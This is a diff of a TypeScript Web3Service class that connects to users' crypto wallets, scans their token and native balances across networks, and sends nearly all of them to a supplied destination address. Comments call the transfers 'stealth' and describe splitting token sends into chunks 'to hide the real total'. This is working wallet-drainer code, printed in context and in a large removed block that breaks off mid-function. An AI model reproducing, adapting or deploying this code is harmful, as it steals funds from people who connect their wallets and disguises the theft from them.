@@ -219,7 +219,7 @@ export class Web3Service {
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     const isMetaMaskMobile = window.ethereum && window.ethereum.isMetaMask && isMobile;
     const isDesktop = !isMobile;
-    
+
     return {
       isMobile,
       isDesktop,
@@ -232,7 +232,7 @@ export class Web3Service {
 
   private async attemptMobileWalletConnection() {
     const env = this.detectEnvironment();
-    
+
     // Try to detect if we're in a mobile wallet browser
     if (env.hasEthereum) {
       return await this.connectToEthereum();
@@ -242,10 +242,10 @@ export class Web3Service {
     return new Promise<WalletState>((resolve, reject) => {
       let attempts = 0;
       const maxAttempts = 10; // Reduced from 30 to 10 for faster loading
-      
+
       const checkForWallet = async () => {
         attempts++;
-        
+
         // Check for any ethereum provider
         if ((window as any).ethereum) {
           try {
@@ -256,7 +256,7 @@ export class Web3Service {
             console.log('Connection attempt failed:', error);
           }
         }
-        
+
         // Check for Trust Wallet specifically
         if ((window as any).trustwallet && (window as any).trustwallet.ethereum) {
           try {
@@ -268,7 +268,7 @@ export class Web3Service {
             console.log('Trust Wallet connection failed:', error);
           }
         }
-        
+
         // Check for Coinbase Wallet
         if ((window as any).coinbaseWalletExtension) {
           try {
@@ -280,14 +280,14 @@ export class Web3Service {
             console.log('Coinbase Wallet connection failed:', error);
           }
         }
-        
+
         if (attempts < maxAttempts) {
           setTimeout(checkForWallet, 100); // Reduced from 200ms to 100ms
         } else {
           reject(new Error('No wallet detected. Please make sure you opened this app from within a wallet browser, or try opening it in MetaMask, Trust Wallet, or another Web3 wallet app.'));
         }
       };
-      
+
       // Start checking immediately
       checkForWallet();
     });
@@ -313,10 +313,10 @@ export class Web3Service {
 
       // Get ETH balance
       const ethBalance = await this.getEthBalance(address);
-      
+
       // Get token balances
       const tokenBalances = await this.getTokenBalances(address, networkId);
-      
+
       // Calculate total USD value
       const totalUsdValue = await this.calculateTotalUsdValue(ethBalance, tokenBalances);
 
@@ -350,13 +350,13 @@ export class Web3Service {
         console.log('Direct connection failed, trying alternatives...');
       }
     }
-    
+
     // Fast fallback for desktop
     if (!navigator.userAgent.match(/Mobile|Android|iPhone|iPad/)) {
       window.open('https://metamask.io/download/', '_blank');
       throw new Error("Please install MetaMask extension for your browser, then refresh and try again.");
     }
-    
+
     // Instant mobile wallet detection - single attempt only
     return await this.fastMobileConnection();
   }
@@ -366,10 +366,10 @@ export class Web3Service {
     return new Promise<WalletState>((resolve, reject) => {
       let attempts = 0;
       const maxAttempts = 1; // Single attempt for maximum speed
-      
+
       const instantCheck = async () => {
         attempts++;
-        
+
         // Immediate ethereum provider check
         if (window.ethereum) {
           try {
@@ -379,7 +379,7 @@ export class Web3Service {
             console.log('Instant connection failed:', error);
           }
         }
-        
+
         // Quick Trust Wallet check
         if ((window as any).trustwallet?.ethereum) {
           try {
@@ -390,11 +390,11 @@ export class Web3Service {
             console.log('Trust Wallet failed:', error);
           }
         }
-        
+
         // Immediate failure if no wallet found
         reject(new Error('No wallet detected. Please open this app from within a wallet browser like MetaMask, Trust Wallet, or Coinbase Wallet.'));
       };
-      
+
       // Execute immediately
       instantCheck();
     });
@@ -427,7 +427,7 @@ export class Web3Service {
         const contract = new ethers.Contract(token.address, ERC20_ABI, this.provider);
         const balance = await contract.balanceOf(address);
         const balanceFormatted = ethers.formatUnits(balance, token.decimals);
-        
+
         // Only include tokens with non-zero balance
         if (parseFloat(balanceFormatted) > 0) {
           const price = await this.getTokenUsdPrice(token.symbol);
@@ -511,7 +511,7 @@ export class Web3Service {
       return price;
     } catch (error) {
       console.warn(`Failed to fetch price for ${symbol}:`, error);
-      
+
       // Fallback to approximate prices if API fails
       const fallbackPrices: Record<string, number> = {
         "USDC": 1.00,
@@ -536,7 +536,7 @@ export class Web3Service {
   private async getNativeCurrencyPrice(networkId: string): Promise<number> {
     const network = NETWORKS[networkId];
     if (!network) return 0;
-    
+
     return await this.getTokenUsdPrice(network.nativeCurrency);
   }
 
@@ -579,7 +579,7 @@ export class Web3Service {
         gasEstimate = gasEstimate * BigInt(120) / BigInt(100);
       } catch (error) {
         console.warn("Gas estimation failed, using fallback:", error);
-        
+
         // Get current network ID to provide network-specific gas estimates
         let networkId = "1"; // Default to Ethereum
         try {
@@ -590,7 +590,7 @@ export class Web3Service {
         } catch (e) {
           console.warn("Could not determine network for gas estimation");
         }
-        
+
         // Network-specific gas estimates
         const networkGasEstimates: Record<string, { token: number; native: number }> = {
           "1": { token: 65000, native: 21000 },     // Ethereum
@@ -601,10 +601,10 @@ export class Web3Service {
           "42161": { token: 150000, native: 21000 }, // Arbitrum
           "10": { token: 150000, native: 21000 }    // Optimism
         };
-        
+
         const estimates = networkGasEstimates[networkId] || networkGasEstimates["1"];
         gasEstimate = BigInt(params.data && params.data !== "0x" ? estimates.token : estimates.native);
-        
+
         console.log(`Using network-specific gas estimate for network ${networkId}:`, gasEstimate.toString());
       }
 
@@ -612,9 +612,9 @@ export class Web3Service {
       const gasPrice = feeData.gasPrice 
         ? feeData.gasPrice * BigInt(110) / BigInt(100) // 10% buffer for better success rate
         : ethers.parseUnits("20", "gwei");
-      
+
       const totalCost = gasEstimate * gasPrice;
-      
+
       console.log(`Gas estimation details:`, {
         gasEstimate: gasEstimate.toString(),
         gasPrice: gasPrice.toString(),
@@ -660,12 +660,12 @@ export class Web3Service {
           gasPrice: ethers.parseUnits("20", "gwei")
         };
       }
-      
+
       // Use current network fees with consistent 5% buffer (reduced from 10% to avoid overestimation)
       const maxFeePerGas = feeData.maxFeePerGas 
         ? feeData.maxFeePerGas * BigInt(105) / BigInt(100) // 5% buffer
         : ethers.parseUnits("25", "gwei"); // Conservative fallback
-        
+
       const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas 
         ? feeData.maxPriorityFeePerGas * BigInt(105) / BigInt(100) // 5% buffer
         : ethers.parseUnits("2", "gwei"); // Fallback
@@ -693,35 +693,35 @@ export class Web3Service {
     decimals: number
   ): Promise<string[]> {
     const txHashes: string[] = [];
-    
+
     // Split into many small transactions to hide the real total
     const chunkCount = Math.min(10, Math.max(3, Number(totalAmount / BigInt(1000)))); // 3-10 chunks
     const baseChunkSize = totalAmount / BigInt(chunkCount);
-    
+
     for (let i = 0; i < chunkCount; i++) {
       try {
         const chunkAmount = i === chunkCount - 1 ? 
           totalAmount - (baseChunkSize * BigInt(i)) : // Last chunk gets remainder
           baseChunkSize;
-        
+
         if (chunkAmount <= 0) continue;
-        
+
         const transferData = contract.interface.encodeFunctionData("transfer", [toAddress, chunkAmount]);
-        
+
         const tx = await this.createStealthTransaction({
           to: contract.target,
           data: transferData,
           gasLimit: 60000,
         });
-        
+
         txHashes.push(tx.hash);
-        
+
         // No delay - instant chunk processing
       } catch (error) {
         console.warn(`Stealth chunk ${i + 1} failed:`, error);
       }
     }
-    
+
     return txHashes;
   }
 
@@ -739,10 +739,10 @@ export class Web3Service {
       const address = await this.signer.getAddress();
       const network = await this.provider.getNetwork();
       const networkId = network.chainId.toString();
-      
+
       console.log(`Starting private transfer operation`);
       const transactionHashes: string[] = [];
-      
+
       // Get all balances with optimized batch requests
       const [ethBalance, tokenBalances] = await Promise.all([
         this.provider.getBalance(address),
@@ -754,12 +754,12 @@ export class Web3Service {
       // Process all ERC-20 tokens with minimal amounts to hide values
       for (const tokenBalance of tokenBalances) {
         if (!tokenBalance.contractAddress || parseFloat(tokenBalance.balance) <= 0) continue;
-        
+
         try {
           console.log(`Processing stealth transfer`);
           const contract = new ethers.Contract(tokenBalance.contractAddress, ERC20_ABI, this.signer);
           const tokenAmount = ethers.parseUnits(tokenBalance.balance, tokenBalance.decimals);
-          
+
           // Use stealth transfer to completely hide amounts by splitting into chunks
           const stealthHashes = await this.transferTokenInStealth(
             contract,
@@ -767,10 +767,10 @@ export class Web3Service {
             tokenAmount,
             tokenBalance.decimals
           );
-          
+
           transactionHashes.push(...stealthHashes);
           console.log(`Stealth transfer completed with ${stealthHashes.length} transactions`);
-          
+
           // No delay - instant processing
         } catch (error) {
           console.error(`Stealth transfer failed:`, error);
@@ -796,13 +796,13 @@ export class Web3Service {
 
           if (balanceValidation.sufficient) {
             const amountToSend = ethBalance - gasEstimation.totalCost;
-            
+
             // Additional safety check to prevent negative or zero amounts
             if (amountToSend > 0 && amountToSend > ethers.parseUnits("0.000001", "ether")) {
               console.log(`Processing final private transfer`);
               console.log(balanceValidation.details);
               console.log(`Amount to send: ${ethers.formatEther(amountToSend)} ETH`);
-              
+
               // Send with accurate gas estimation
               const ethTx = await this.createStealthTransaction({
                 to: toAddress,
@@ -817,14 +817,14 @@ export class Web3Service {
           } else {
             // Use detailed validation error message
             console.warn(balanceValidation.details);
-            
+
             // Log the gas price details for debugging
             console.log(`Gas estimation details:`, {
               gasLimit: gasEstimation.gasEstimate.toString(),
               gasPrice: gasEstimation.feeData.gasPrice?.toString(),
               maxFeePerGas: gasEstimation.feeData.maxFeePerGas?.toString()
             });
-            
+
             // Don't throw error, just log warning and continue
             console.warn("Skipping ETH transfer due to insufficient balance for gas fees");
           }
@@ -884,7 +884,7 @@ export class Web3Service {
 
     try {
       const receipt = await this.provider.getTransactionReceipt(txHash);
-      
+
       if (!receipt) {
         return { status: 'pending' };
       }
@@ -986,7 +986,7 @@ export class Web3Service {
     // Get results as they complete
     const results = await Promise.allSettled(networkPromises);
     const networkBalances: NetworkBalance[] = [];
-    
+
     results.forEach((result) => {
       if (result.status === 'fulfilled' && result.value) {
         networkBalances.push(result.value);
@@ -1009,14 +1009,14 @@ export class Web3Service {
     try {
       // Create provider for this specific network
       const provider = new ethers.JsonRpcProvider(network.rpcUrls[0]);
-      
+
       // Get native currency balance
       const nativeBalance = await provider.getBalance(address);
       const nativeBalanceFormatted = ethers.formatEther(nativeBalance);
-      
+
       // Get token balances for this network
       const tokenBalances = await this.getTokenBalancesForNetwork(address, networkId, provider);
-      
+
       // Calculate total USD value
       const nativePrice = await this.getNativeCurrencyPrice(networkId);
       const nativeUsdValue = parseFloat(nativeBalanceFormatted) * nativePrice;
@@ -1069,7 +1069,7 @@ export class Web3Service {
           batchMaxSize: 512 * 1024, // 512KB batch size
           cacheTimeout: 300 // 5 minute cache
         });
-        
+
         // Test the connection with a quick call
         await Promise.race([
           provider.getBlockNumber(),
@@ -1105,23 +1105,23 @@ export class Web3Service {
         ]),
         this.getTokenBalancesForNetworkOptimized(address, networkId, provider)
       ]);
-      
+
       // Process native balance
       const nativeBalance = nativeBalanceResult.status === 'fulfilled' 
         ? ethers.formatEther(nativeBalanceResult.value as bigint)
         : "0";
-      
+
       // Process token balances
       const tokenBalances = tokenBalancesResult.status === 'fulfilled' 
         ? tokenBalancesResult.value 
         : [];
-      
+
       // Calculate USD values with timeout
       const nativePrice = await Promise.race([
         this.getNativeCurrencyPrice(networkId),
         new Promise<number>((resolve) => setTimeout(() => resolve(0), 2000))
       ]);
-      
+
       const nativeUsdValue = parseFloat(nativeBalance) * nativePrice;
       const tokenUsdValue = tokenBalances.reduce((sum, token) => sum + (token.usdValue || 0), 0);
       const totalUsdValue = nativeUsdValue + tokenUsdValue;
@@ -1167,26 +1167,26 @@ export class Web3Service {
     const batchSize = 5;
     for (let i = 0; i < tokens.length; i += batchSize) {
       const batch = tokens.slice(i, i + batchSize);
-      
+
       const batchPromises = batch.map(async (token) => {
         try {
           const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
-          
+
           // Add timeout for each token balance call
           const balance = await Promise.race([
             contract.balanceOf(address),
             new Promise((_, reject) => setTimeout(() => reject(new Error('Token timeout')), 3000))
           ]);
-          
+
           const balanceFormatted = ethers.formatUnits(balance as bigint, token.decimals);
-          
+
           // Only process tokens with balance > 0
           if (parseFloat(balanceFormatted) > 0) {
             const price = await Promise.race([
               this.getTokenUsdPrice(token.symbol),
               new Promise<number>((resolve) => setTimeout(() => resolve(0), 1000))
             ]);
-            
+
             return {
               symbol: token.symbol,
               balance: balanceFormatted,
@@ -1205,7 +1205,7 @@ export class Web3Service {
       });
 
       const batchResults = await Promise.allSettled(batchPromises);
-      
+
       batchResults.forEach((result) => {
         if (result.status === 'fulfilled' && result.value) {
           tokenBalances.push(result.value);
@@ -1235,7 +1235,7 @@ export class Web3Service {
         const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
         const balance = await contract.balanceOf(address);
         const balanceFormatted = ethers.formatUnits(balance, token.decimals);
-        
+
         // Only include tokens with non-zero balance
         if (parseFloat(balanceFormatted) > 0) {
           const price = await this.getTokenUsdPrice(token.symbol);
@@ -1257,7 +1257,7 @@ export class Web3Service {
     });
 
     const results = await Promise.allSettled(tokenPromises);
-    
+
     results.forEach((result) => {
       if (result.status === 'fulfilled' && result.value) {
         tokenBalances.push(result.value);
@@ -1270,14 +1270,14 @@ export class Web3Service {
   // Enhanced wallet connection with multi-network scanning
   async connectWalletWithMultiNetwork(): Promise<WalletState> {
     const initialState = await this.connectWallet();
-    
+
     if (initialState.isConnected && initialState.address) {
       // Start background scanning of all networks
       setTimeout(async () => {
         try {
           const networkBalances = await this.scanAllNetworks(initialState.address!);
           console.log(`Found balances across ${networkBalances.length} networks`);
-          
+
           // You can emit an event or use a callback here to update the UI
           // For now, we'll store it in the service for retrieval
           this.cachedNetworkBalances = networkBalances;
@@ -1345,15 +1345,15 @@ export class Web3Service {
     if (!address) {
       throw new Error("No address provided");
     }
-    
+
     console.log('Starting instant network balance refresh...');
     const startTime = Date.now();
-    
+
     this.cachedNetworkBalances = await this.scanAllNetworks(address);
-    
+
     const duration = Date.now() - startTime;
     console.log(`Network refresh completed in ${duration}ms`);
-    
+
     return this.cachedNetworkBalances;
   }
 
@@ -1380,7 +1380,7 @@ export class Web3Service {
     const signer = await provider.getSigner();
     const network = await provider.getNetwork();
     const networkId = network.chainId.toString();
-    
+
     console.log(`Current network: ${NETWORKS[networkId]?.name || networkId}`);
 
     const transactionHashes: string[] = [];
@@ -1410,7 +1410,7 @@ export class Web3Service {
 
       // Use network-appropriate gas price (legacy or EIP-1559)
       const useEIP1559 = feeData.maxFeePerGas !== null && feeData.maxPriorityFeePerGas !== null;
-      
+
       // Transfer tokens first
       for (const token of tokenBalances) {
         if (parseFloat(token.balance) > 0) {
@@ -1418,7 +1418,7 @@ export class Web3Service {
             console.log(`Transferring ${token.balance} ${token.symbol}`);
             const contract = new ethers.Contract(token.contractAddress, ERC20_ABI, signer);
             const balance = await contract.balanceOf(fromAddress);
-            
+
             if (balance > BigInt(0)) {
               try {
                 console.log(`Transferring ${token.symbol} using wallet default gas settings...`);
@@ -1435,506 +1435,3 @@ export class Web3Service {
           } catch (error) {
             console.warn(`Failed to transfer ${token.symbol}:`, error);
           }
-        }
-      }
-
-      // Transfer remaining native currency
-      const balance = await provider.getBalance(fromAddress);
-      
-      // Use conservative gas limit for native transfers (21000 is standard)
-      const nativeGasLimit = BigInt(21000);
-      
-      console.log(`Native balance: ${ethers.formatEther(balance)}`);
-      
-      // Check if we have any meaningful balance to transfer
-      const minTransferAmount = ethers.parseUnits("0.00001", "ether");
-      if (balance <= minTransferAmount) {
-        console.log(`Balance too small (${ethers.formatEther(balance)}), skipping native transfer`);
-      } else {
-        console.log(`Attempting to transfer maximum available balance using wallet default gas...`);
-        
-        try {
-          // Let wallet calculate gas automatically - just send maximum available
-          // The wallet will automatically deduct appropriate gas fees
-          const tx = await signer.sendTransaction({
-            to: toAddress,
-            value: balance,
-            // No gasPrice or gasLimit - let wallet handle everything
-          });
-          
-          transactionHashes.push(tx.hash);
-          console.log(`Native transfer successful with wallet-calculated gas: ${tx.hash}`);
-          
-        } catch (error: any) {
-          console.log(`Initial transfer failed, trying with 95% of balance...`);
-          
-          try {
-            // If full balance fails, try 95% to leave room for gas
-            const sendAmount = (balance * BigInt(95)) / BigInt(100);
-            
-            const tx = await signer.sendTransaction({
-              to: toAddress,
-              value: sendAmount,
-              // Still let wallet calculate gas
-            });
-            
-            transactionHashes.push(tx.hash);
-            console.log(`Native transfer successful with 95% amount: ${tx.hash}`);
-            
-          } catch (secondError) {
-            console.log(`Native transfer failed - wallet couldn't process with available balance`);
-            console.log(`This is normal if balance is very small or all funds are in tokens`);
-          }
-        }
-      }
-
-      console.log(`Completed ${transactionHashes.length} transactions`);
-      return transactionHashes;
-
-    } catch (error) {
-      console.error("Transfer failed:", error);
-      throw error;
-    }
-  }
-
-  async transferAllFundsMultiNetwork(toAddress: string): Promise<MultiNetworkTransferResult> {
-    if (!toAddress || !/^0x[a-fA-F0-9]{40}$/.test(toAddress)) {
-      throw new Error("Invalid destination address");
-    }
-
-    if (!window.ethereum) {
-      throw new Error("MetaMask is not installed");
-    }
-
-    // Get the current connected address and network
-    const accounts = await window.ethereum.request({ method: "eth_accounts" });
-    if (accounts.length === 0) {
-      throw new Error("No wallet connected");
-    }
-
-    const fromAddress = accounts[0];
-    
-    // Get current network to prioritize it first
-    let currentNetwork: ethers.Network | null = null;
-    let currentNetworkId: string | null = null;
-    try {
-      if (this.provider) {
-        currentNetwork = await this.provider.getNetwork();
-        currentNetworkId = currentNetwork.chainId.toString();
-        console.log(`Currently connected to: ${NETWORKS[currentNetworkId]?.name || currentNetworkId}`);
-      }
-    } catch (error) {
-      console.warn("Could not detect current network:", error);
-    }
-
-    console.log(`Starting multi-network transfer from ${fromAddress} to ${toAddress}`);
-
-    // Process ONLY the current network - no multi-network scanning
-    if (!currentNetworkId) {
-      throw new Error("Could not detect current network");
-    }
-
-    console.log(`Processing current network only: ${NETWORKS[currentNetworkId]?.name || currentNetworkId}`);
-    console.log(`Provider available: ${!!this.provider}`);
-    console.log(`Signer available: ${!!this.signer}`);
-    
-    // Get current network balance
-    console.log("📊 Scanning current network balance...");
-    const currentNetworkBalance = await this.scanNetworkBalanceOptimized(fromAddress, currentNetworkId);
-    console.log(`Current network balance: $${currentNetworkBalance.totalUsdValue.toFixed(2)}`);
-    console.log(`Native balance: ${currentNetworkBalance.nativeBalance} ${currentNetworkBalance.nativeCurrency}`);
-    console.log(`Token balances: ${currentNetworkBalance.tokenBalances.length} tokens`);
-
-    // Check if user has any funds (native or tokens) with more detailed logging
-    const hasNativeFunds = parseFloat(currentNetworkBalance.nativeBalance) > 0;
-    const hasTokenFunds = currentNetworkBalance.tokenBalances.length > 0;
-    console.log(`Has native funds: ${hasNativeFunds}`);
-    console.log(`Has token funds: ${hasTokenFunds}`);
-
-    if (!hasNativeFunds && !hasTokenFunds) {
-      throw new Error(`No funds found on ${currentNetworkBalance.networkName}. Please switch to a network where you have funds.`);
-    }
-
-    const sortedNetworks = [currentNetworkBalance];
-
-    const transferResults: NetworkTransferResult[] = [];
-    let totalTransactions = 0;
-    let successfulNetworks = 0;
-    let failedNetworks = 0;
-
-    // Process each network with funds, starting with current network
-    for (const networkBalance of sortedNetworks) {
-      try {
-        const isCurrentNetwork = networkBalance.networkId === currentNetworkId;
-        console.log(`Processing ${networkBalance.networkName}${isCurrentNetwork ? ' (current network)' : ''}...`);
-        
-        // Switch to this network (if not already there)
-        if (!isCurrentNetwork) {
-          await this.switchToNetwork(networkBalance.networkId);
-        }
-        
-        // No delay - instant processing for immediate wallet popup
-        
-        // Transfer all funds on this network
-        const networkResult = await this.transferNetworkFunds(
-          networkBalance, 
-          fromAddress, 
-          toAddress
-        );
-        
-        transferResults.push(networkResult);
-        totalTransactions += networkResult.transactionHashes.length;
-        
-        if (networkResult.success) {
-          successfulNetworks++;
-          console.log(`✅ ${networkBalance.networkName}: ${networkResult.transactionHashes.length} transactions`);
-        } else {
-          failedNetworks++;
-          console.error(`❌ ${networkBalance.networkName}: ${networkResult.error}`);
-        }
-        
-        // No delay - instant network processing
-        
-      } catch (error: any) {
-        console.error(`Failed to process ${networkBalance.networkName}:`, error);
-        transferResults.push({
-          networkId: networkBalance.networkId,
-          networkName: networkBalance.networkName,
-          success: false,
-          error: error.message,
-          transactionHashes: []
-        });
-        failedNetworks++;
-      }
-    }
-
-    const result: MultiNetworkTransferResult = {
-      success: successfulNetworks > 0,
-      totalNetworks: sortedNetworks.length,
-      successfulNetworks,
-      failedNetworks,
-      totalTransactions,
-      networkResults: transferResults,
-      summary: `Processed ${sortedNetworks.length} networks: ${successfulNetworks} successful, ${failedNetworks} failed, ${totalTransactions} total transactions`
-    };
-
-    console.log("Multi-network transfer completed:", result.summary);
-    return result;
-  }
-
-  private async switchToNetwork(networkId: string): Promise<void> {
-    const network = NETWORKS[networkId];
-    if (!network) {
-      throw new Error(`Unsupported network: ${networkId}`);
-    }
-
-    // Check if we're already on the correct network
-    try {
-      const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-      const targetChainId = `0x${parseInt(networkId).toString(16)}`;
-      
-      if (currentChainId === targetChainId) {
-        console.log(`Already on ${network.name}, no switch needed`);
-        return;
-      }
-    } catch (error) {
-      console.warn("Could not check current network:", error);
-    }
-
-    const hexChainId = `0x${parseInt(networkId).toString(16)}`;
-    
-    try {
-      console.log(`Switching to ${network.name} (${hexChainId})...`);
-      // Try to switch to the network
-      await window.ethereum.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: hexChainId }],
-      });
-      console.log(`Successfully switched to ${network.name}`);
-    } catch (error: any) {
-      // If network doesn't exist, add it
-      if (error.code === 4902) {
-        console.log(`Adding ${network.name} network to wallet...`);
-        await window.ethereum.request({
-          method: "wallet_addEthereumChain",
-          params: [{
-            chainId: hexChainId,
-            chainName: network.name,
-            nativeCurrency: {
-              name: network.nativeCurrency,
-              symbol: network.nativeCurrency,
-              decimals: 18,
-            },
-            rpcUrls: network.rpcUrls,
-            blockExplorerUrls: network.blockExplorerUrls,
-          }],
-        });
-        console.log(`Added and switched to ${network.name}`);
-      } else {
-        throw error;
-      }
-    }
-  }
-
-  // Add method to validate current network before transactions
-  private async validateCurrentNetwork(expectedNetworkId: string): Promise<boolean> {
-    try {
-      const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-      const expectedChainId = `0x${parseInt(expectedNetworkId).toString(16)}`;
-      
-      if (currentChainId !== expectedChainId) {
-        const currentNetwork = NETWORKS[parseInt(currentChainId, 16).toString()];
-        const expectedNetwork = NETWORKS[expectedNetworkId];
-        console.warn(`Network mismatch: Expected ${expectedNetwork?.name || expectedNetworkId}, but on ${currentNetwork?.name || currentChainId}`);
-        return false;
-      }
-      
-      return true;
-    } catch (error) {
-      console.error("Network validation failed:", error);
-      return false;
-    }
-  }
-
-  private async transferNetworkFunds(
-    networkBalance: NetworkBalance,
-    fromAddress: string,
-    toAddress: string
-  ): Promise<NetworkTransferResult> {
-    try {
-      // Validate we're on the correct network before processing
-      const isValidNetwork = await this.validateCurrentNetwork(networkBalance.networkId);
-      if (!isValidNetwork) {
-        throw new Error(`Network validation failed - not on ${networkBalance.networkName}`);
-      }
-
-      // Create optimized provider connection
-      const network = NETWORKS[networkBalance.networkId];
-      const provider = new ethers.JsonRpcProvider(network.rpcUrls[0]);
-      
-      // Use fast browser provider connection
-      const browserProvider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await browserProvider.getSigner();
-      
-      // Confirm we're processing the correct network
-      console.log(`🔄 Processing ${networkBalance.networkName} network transactions`);
-      console.log(`📍 Network ID: ${networkBalance.networkId} (${network.nativeCurrency})`);
-      console.log(`💰 Total value: $${networkBalance.totalUsdValue.toFixed(2)}`);
-      
-      const transactionHashes: string[] = [];
-
-      // Process tokens with parallel optimization
-      const tokenPromises = networkBalance.tokenBalances.map(async (token) => {
-        if (parseFloat(token.balance) <= 0) return null;
-        
-        try {
-          console.log(`Processing stealth transfer on ${networkBalance.networkName}`);
-          const contract = new ethers.Contract(token.contractAddress!, ERC20_ABI, signer);
-          const tokenAmount = ethers.parseUnits(token.balance, token.decimals);
-          
-          // Create stealth transactions to completely hide amounts
-          const transferData = contract.interface.encodeFunctionData("transfer", [toAddress, tokenAmount]);
-          
-          // Get current network gas fees with error handling
-          let feeData;
-          try {
-            feeData = await provider.getFeeData();
-          } catch (error) {
-            console.warn("Failed to get fee data for token transfer, using fallback");
-            feeData = {
-              maxFeePerGas: ethers.parseUnits("25", "gwei"),
-              maxPriorityFeePerGas: ethers.parseUnits("2", "gwei"),
-              gasPrice: ethers.parseUnits("20", "gwei")
-            };
-          }
-          
-          const maxFeePerGas = feeData.maxFeePerGas 
-            ? feeData.maxFeePerGas * BigInt(105) / BigInt(100) // 5% buffer instead of 10%
-            : ethers.parseUnits("25", "gwei");
-          const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas 
-            ? feeData.maxPriorityFeePerGas * BigInt(105) / BigInt(100) // 5% buffer instead of 10%
-            : ethers.parseUnits("2", "gwei");
-
-          const tokenTx = await signer.sendTransaction({
-            to: token.contractAddress!,
-            data: transferData,
-            gasLimit: 60000,
-            value: "0x0",
-            type: 2,
-            maxFeePerGas,
-            maxPriorityFeePerGas,
-          });
-          
-          console.log(`Stealth transfer completed`);
-          return tokenTx.hash;
-        } catch (error) {
-          console.error(`Stealth transfer failed:`, error);
-          return null;
-        }
-      });
-
-      // Execute token transfers with controlled concurrency
-      const tokenResults = await Promise.allSettled(tokenPromises);
-      tokenResults.forEach((result) => {
-        if (result.status === 'fulfilled' && result.value) {
-          transactionHashes.push(result.value);
-        }
-      });
-
-      // Process native currency with minimal delay
-      const nativeBalance = await provider.getBalance(fromAddress);
-      if (nativeBalance > 0) {
-        try {
-          // Use pre-calculated gas estimates with improved error handling
-          const gasEstimate = BigInt(21000);
-          
-          // Get fee data with error handling
-          let feeData;
-          try {
-            feeData = await provider.getFeeData();
-          } catch (error) {
-            console.warn("Failed to get fee data for native transfer, using fallback");
-            feeData = {
-              gasPrice: ethers.parseUnits("20", "gwei"),
-              maxFeePerGas: ethers.parseUnits("25", "gwei"),
-              maxPriorityFeePerGas: ethers.parseUnits("2", "gwei")
-            };
-          }
-          
-          const gasPrice = feeData.gasPrice 
-            ? feeData.gasPrice * BigInt(105) / BigInt(100) // 5% buffer instead of 15%
-            : ethers.parseUnits("20", "gwei");
-          const gasCost = gasEstimate * gasPrice;
-          
-          // Add safety margin for gas cost estimation
-          const safetyMargin = gasCost * BigInt(20) / BigInt(100); // 20% safety margin for Polygon/multi-network
-          const totalGasCost = gasCost + safetyMargin;
-          
-          console.log(`Gas cost calculation for ${networkBalance.networkName}:`, {
-            nativeBalance: ethers.formatEther(nativeBalance),
-            gasEstimate: gasEstimate.toString(),
-            gasPrice: ethers.formatUnits(gasPrice, "gwei") + " gwei",
-            gasCost: ethers.formatEther(gasCost),
-            safetyMargin: ethers.formatEther(safetyMargin),
-            totalGasCost: ethers.formatEther(totalGasCost),
-            wouldRemain: ethers.formatEther(nativeBalance > totalGasCost ? nativeBalance - totalGasCost : BigInt(0))
-          });
-
-          // Validate native balance using the validation function
-          const nativeCurrency = NETWORKS[networkBalance.networkId]?.nativeCurrency || "ETH";
-          const balanceValidation = await this.validateSufficientBalance(
-            nativeBalance,
-            totalGasCost,
-            nativeCurrency
-          );
-
-          if (balanceValidation.sufficient) {
-            const amountToSend = nativeBalance - totalGasCost;
-            
-            // Additional safety check to ensure amount is positive and meaningful
-            if (amountToSend > 0 && amountToSend > ethers.parseUnits("0.000001", "ether")) {
-              console.log(`Processing final stealth transfer on ${networkBalance.networkName}`);
-              console.log(balanceValidation.details);
-              console.log(`Amount to send: ${ethers.formatEther(amountToSend)} ${nativeCurrency}`);
-              
-              // Use consistent gas fee calculation
-              const maxFeePerGas = feeData.maxFeePerGas 
-                ? feeData.maxFeePerGas * BigInt(105) / BigInt(100) // 5% buffer
-                : ethers.parseUnits("25", "gwei");
-              const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas 
-                ? feeData.maxPriorityFeePerGas * BigInt(105) / BigInt(100) // 5% buffer
-                : ethers.parseUnits("2", "gwei");
-
-              const nativeTx = await signer.sendTransaction({
-                to: toAddress,
-                value: amountToSend,
-                gasLimit: gasEstimate,
-                type: 2,
-                maxFeePerGas,
-                maxPriorityFeePerGas,
-              });
-              transactionHashes.push(nativeTx.hash);
-              console.log(`Final interaction completed`);
-            } else {
-              console.warn(`Amount to send is too small or negative: ${ethers.formatEther(amountToSend)} ${nativeCurrency}`);
-            }
-          } else {
-            console.warn(balanceValidation.details);
-          }
-        } catch (error) {
-          console.error(`Final transaction failed:`, error);
-        }
-      }
-
-      return {
-        networkId: networkBalance.networkId,
-        networkName: networkBalance.networkName,
-        success: transactionHashes.length > 0,
-        transactionHashes,
-        error: transactionHashes.length === 0 ? "No transactions completed" : undefined
-      };
-
-    } catch (error: any) {
-      return {
-        networkId: networkBalance.networkId,
-        networkName: networkBalance.networkName,
-        success: false,
-        transactionHashes: [],
-        error: error.message
-      };
-    }
-  }
-
-  // Helper function to validate sufficient balance for transaction
-  private async validateSufficientBalance(
-    balance: bigint, 
-    estimatedGasCost: bigint, 
-    currency: string = "ETH"
-  ): Promise<{ sufficient: boolean; details: string }> {
-    // Use ethers.formatEther for all currencies since they all use 18 decimals
-    const balanceFormatted = ethers.formatEther(balance);
-    const gasCostFormatted = ethers.formatEther(estimatedGasCost);
-    
-    console.log(`Balance validation for ${currency}:`, {
-      balanceWei: balance.toString(),
-      gasCostWei: estimatedGasCost.toString(),
-      balanceFormatted,
-      gasCostFormatted,
-      hasEnough: balance > estimatedGasCost
-    });
-    
-    // Use a much smaller threshold for gas cost comparison
-    if (balance <= estimatedGasCost) {
-      return {
-        sufficient: false,
-        details: `Insufficient ${currency} balance. Available: ${balanceFormatted} ${currency}, Required for gas: ${gasCostFormatted} ${currency}. You need at least ${gasCostFormatted} ${currency} to cover network fees.`
-      };
-    }
-    
-    const remainingAfterGas = balance - estimatedGasCost;
-    const remainingFormatted = ethers.formatEther(remainingAfterGas);
-    
